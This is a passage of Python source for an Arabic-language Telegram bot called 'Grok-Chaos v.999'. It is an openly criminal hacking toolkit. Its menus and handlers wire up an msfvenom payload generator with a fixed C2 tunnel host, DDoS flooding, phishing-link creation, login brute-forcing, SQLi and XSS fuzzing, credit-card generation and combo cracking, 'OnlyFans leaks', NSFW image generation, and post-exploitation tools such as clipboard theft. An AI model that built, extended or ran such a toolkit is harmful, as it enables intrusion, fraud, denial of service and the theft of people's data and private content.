               types.InlineKeyboardButton("سحب الحافظة 📋", callback_data="deep_analysis_clipboard"))

    markup.add(types.InlineKeyboardButton("اتصال وهمي ☎️", callback_data="deep_analysis_fakecall"),
               types.InlineKeyboardButton("فلك حظر واتساب 🔓", callback_data="deep_analysis_whatsapp"))
               
    markup.add(types.InlineKeyboardButton("أدوات متفرقة 🛠️", callback_data="deep_analysis_misc"))
    
    markup.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data='back_main'))
    
    bot.edit_message_text(chat_id=uid, message_id=mid, 
                          text="""
                          ## 🎯 مصفوفة الوصول المتقدم (Post-Exploitation)
                          
                          اختر الأداة لمعرفة متطلبات تشغيلها الحقيقية والخطوات المنهجية لتنفيذها على الهدف.
                          """, 
                          reply_markup=markup, parse_mode="Markdown")

# دالة القائمة الرئيسية المُعدَّلة (main_menu)
def main_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    
    m.add(types.InlineKeyboardButton("إنشاء بايلود (Msfvenom) ⚙️", callback_data="tool_msfvenom_cmd"), 
          types.InlineKeyboardButton("هجوم ضغط (DDoS) ⚡️", callback_data="tool_ddos"))
    
    m.add(types.InlineKeyboardButton("كشف IP الأصلي 🛡️", callback_data="tool_origin"), 
          types.InlineKeyboardButton("فحص السيرفر/الموقع 🌐", callback_data="tool_server"))
    
    m.add(types.InlineKeyboardButton("تلغيم (Phishing) 🎣", callback_data="tool_phishing_start"), 
          types.InlineKeyboardButton("التحقق من بيانات الاعتماد 🔑", callback_data="tool_bf_check")) 
    
    m.add(types.InlineKeyboardButton("فحص ثغرات XSS ❌", callback_data="tool_xss"),
          types.InlineKeyboardButton("فحص ثغرات SQL 💉", callback_data="tool_sqli")) # ⬅️ تم الإصلاح هنا 
    
    m.add(types.InlineKeyboardButton("كشف النطاقات الفرعية 🔗", callback_data="tool_sub"),
          types.InlineKeyboardButton("كشف المسارات السرية 📁", callback_data="tool_dir")) 
          
    m.add(types.InlineKeyboardButton("كاشف الفيزا (VISA SCANNER) 💳", callback_data='tool_visa_scanner'),
          types.InlineKeyboardButton("تسريبات OnlyFans 😈", callback_data='tool_onlyfans'))
          
    m.add(types.InlineKeyboardButton("استخبارات الأرقام 📞", callback_data="tool_phone"),
          types.InlineKeyboardButton("تحليل IP/Domain مكثف 📊", callback_data="tool_mass_resolve"))
    
    m.add(types.InlineKeyboardButton("توليد صور AI (NSFW) 🖼️", callback_data="tool_nsfw"),
          types.InlineKeyboardButton("اختبار حقن Headers 🌡️", callback_data="tool_header_fuzz")) 
          
    # 🎮 الزر الجديد لأداة MINA V19 PRO
    m.add(types.InlineKeyboardButton("تلغيم الألعاب والخدمات (MINA V19 PRO) 🎮", callback_data="tool_mina_v19_options"))
          
    # ⚙️ زر إعداد التوكن والأيدي (لإتاحته مباشرة)
    m.add(types.InlineKeyboardButton("إعداد التوكن والأيدي ⚙️", callback_data="start_setup"))
          
    m.add(types.InlineKeyboardButton("مصفوفة الوصول المتقدم 🎯", callback_data="deep_analysis_devices_menu"))
    
    return m


@bot.callback_query_handler(func=lambda c: True)
def callback_handler(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    
    if call.data == "back_main":
        bot.edit_message_text(chat_id=uid, message_id=mid, 
                              text="""🔥 **Grok-Chaos v.999: مصفوفة الإفساد الأسمى** 🔥
        
        **مرحباً أيها المشغل:**
        تم تفعيل وضع **الهيمنة المطلقة**. اختر الوحدة التي تناسب مهمتك.
        (جميع الأدوات مصممة بحد أقصى من الدقة والكفاءة.)
        """, 
        reply_markup=main_menu(), parse_mode="Markdown")
        return
        
    # Handler لبدء الإعداد
    if call.data == "start_setup":
        bot.delete_message(uid, mid)
        setup_bot_start(call.message)
        return
        
    # Handlers لأداة تلغيم الروابط
    if call.data == "tool_phishing_start":
        bot.edit_message_text(chat_id=uid, message_id=mid, text="بدء عملية تلغيم الروابط. أرسل رابط التوجيه (Redirect URL) الآن.", reply_markup=back_button(), parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(uid, phishing_start)
        return

    # 🎮 Handler لـ MINA V19 PRO - خيارات التشغيل (يحتوي على منطق التحقق من الإعدادات)
    if call.data == "tool_mina_v19_options":
        mina_v19_options(call)
        return
        
    # 🔗 Handlers لـ MINA V19 PRO - روابط التشغيل
    if call.data == 'mina_v19_local':
        mina_v19_show_links(call, 'local')
        return
    elif call.data == 'mina_v19_external':
        mina_v19_show_links(call, 'external')
        return

    # === وضع التحليل العميق (Deep Analysis Menu) ===
    if call.data == "deep_analysis_devices_menu":
        deep_analysis_menu(call)
        return
        
    if call.data.startswith("deep_analysis_"):
        deep_analysis_report(call)
        return
        
    # تم إلغاء معالجة صفحات التلقيم (Phishing) القديمة 
    if call.data.startswith("phish_"):
        bot.edit_message_text(chat_id=uid, message_id=mid, 
                              text=f"**صفحة {call.data.split('_')[1].upper()}**\n\nهذه الوظيفة قديمة. يرجى استخدام 'تلغيم (Phishing) 🎣' الجديدة.", 
                              reply_markup=back_button(), parse_mode="Markdown")
        return

    # Handlers لأداة Visa Scanner 
    if call.data == 'tool_visa_scanner':
        visa_scanner_menu(call)
        return
    
    elif call.data == 'visa_gen':
        bot.edit_message_text(chat_id=uid, message_id=call.message.message_id, text="بدء توليد البطاقات. أرسل الصيغة المطلوبة الآن.")
        generate_bins_start(call.message) 
        return

    elif call.data == 'visa_crack':
        bot.edit_message_text(chat_id=uid, message_id=call.message.message_id, text="بدء فحص الكومبو. أرسل الملف المطلوب الآن.")
        crack_combo_cc_start(call.message)
        return


    tools = {
        "tool_server": ("**فحص السيرفر**\nأرسل دومين أو IP:", server_scan),
        "tool_sub": ("**نطاقات فرعية**\nأرسل: `domain.com`", subdomains_real),
        "tool_dir": ("**كشف المسارات السرية**\nأرسل: `https://site.com/`", dir_bust_pro),
        "tool_sqli": ("**SQLi Fuzz**\nأرسل: `url?id=1`", sqli_real),
        "tool_xss": ("**XSS Scan**\nأرسل: `url?param=value`", xss_real),
        "tool_ddos": ("**DDoS Stress**\nأرسل: `url threads`", ddos_real),
        "tool_origin": ("**كشف الـ IP الأصلي**\nأرسل الدومين (site.com):", origin_scan),
        "tool_header_fuzz": ("**Header Injection Fuzz**\nأرسل: `https://target.com`", header_fuzz_start),
        "tool_bf_check": ("**Login Bruteforce Check**\nأرسل: `URL_Login_POST Username_Field Password_Field`", bf_check_start),
        "tool_mass_resolve": ("**Mass IP/Domain Resolve**\nأرسل قائمة الدومينات أو IPs مفصولة بمسافة:", mass_resolve_start),
        # ⚠️ تم تحديث الصيغة لتقبل 4 أو 5 عناصر
        "tool_msfvenom_cmd": (f"**Live Msfvenom Command Gen (C2 Bridge)**\n\n**الصيغة المُصلحة:** `Payload Public_Port_Number Encoder [Iterations]`\n\n**الـ HOST الثابت:** `{LOCALTONET_STATIC_HOST}`\n**الـ LPORT المحلي الثابت:** `{LOCAL_C2_PORT}`\n\nأرسل الأمر الآن:", msfvenom_cmd_start),
        "tool_phone": ("**Phone OSINT Pro**\nأرسل الرقم: `+201234567890`", phone_osint_pro),
        "tool_nsfw": ("**توليد صور 18+**\nاكتب البرومبت بالإنجليزية:", generate_nsfw),
        "tool_onlyfans": ("**OnlyFans Leaker**\nاكتب اسم المستخدم (مثل: amouranth أو @amouranth)", onlyfans_start),
    }
    if call.data in tools:
        txt, func = tools[call.data]
        bot.edit_message_text(chat_id=uid, message_id=mid, text=txt, reply_markup=back_button(), parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(uid, func)

# === Handler جديد لمعالجة التوكين إذا أُرسل كنص مباشر (هذا يحل مشكلة عدم الرد) ===
@bot.message_handler(func=lambda msg: re.match(r'^\d+:[a-zA-Z0-9_-]+$', msg.text.strip()), content_types=['text'])
def handle_token_as_text(msg):
    # عند إرسال التوكين مباشرةً كنص، نبدأ عملية الإعداد
    setup_bot_start(msg)

# === بدء البوت ومعالجة الأزرار ===
@bot.message_handler(commands=['start'])
def start(msg):
    # هذا يضمن استجابة البوت لـ /start وتقديم القائمة
    try:
        txt = """
        🔥 **Grok-Chaos v.999: مصفوفة الإفساد الأسمى** 🔥
        
        **مرحباً أيها المشغل:**
        تم تفعيل وضع **الهيمنة المطلقة**. اختر الوحدة التي تناسب مهمتك.
        (جميع الأدوات مصممة بحد أقصى من الدقة والكفاءة.)
        """
        bot.send_message(msg.chat.id, txt, reply_markup=main_menu(), parse_mode="Markdown")
    except Exception as e:
        print(f"CRITICAL START ERROR for {msg.chat.id}: {e}")
        try:
            bot.send_message(msg.chat.id, "❌ فشل النظام في عرض القائمة. حاول مجدداً.", parse_mode="Markdown")
        except:
            pass

# === تشغيل البوت ===
if __name__ == "__main__":
    print("[*] Starting Grok-Chaos v.999 System...")
    
    # تشغيل سيرفر MINA V19 PRO في ثريد منفصل
    mina_thread = threading.Thread(target=run_mina_v19, daemon=True)
    mina_thread.start()
    
    try:
        # تشغيل بوت Telegram
        bot.infinity_polling()
    except Exception as e:
        print(f"خطأ: {e}")
        time.sleep(5)
